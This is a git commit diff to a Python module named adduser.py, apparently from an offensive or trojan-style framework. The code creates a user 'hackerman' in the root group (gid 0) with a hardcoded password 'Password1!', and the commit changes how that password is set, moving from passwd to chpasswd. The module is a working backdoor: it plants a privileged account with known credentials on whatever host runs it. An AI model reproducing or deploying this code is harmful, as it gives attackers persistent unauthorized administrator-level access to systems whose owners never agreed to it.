4012aa695eb3fd04b86fe321971a9ad91f762b8b
dylup <johnson42d@gmail.com>
2018-12-16 21:44:57 -0500

    Linux is hard

--- modules/adduser.py
+++ modules/adduser.py
@@ -8,7 +8,7 @@ def run(**args):
     output = subprocess.check_output("useradd -g 0 -m hackerman", stderr=subprocess.STDOUT, shell=True)
     info += output + "\n"
 
-    output = subprocess.check_output("echo -n 'Password1!' | passwd hackerman", stderr=subprocess.STDOUT, shell=True)
+    output = subprocess.check_output("echo -n 'hackerman:Password1!' | chpasswd", stderr=subprocess.STDOUT, shell=True)
     info += output + "\n"
 
     info += "user added"
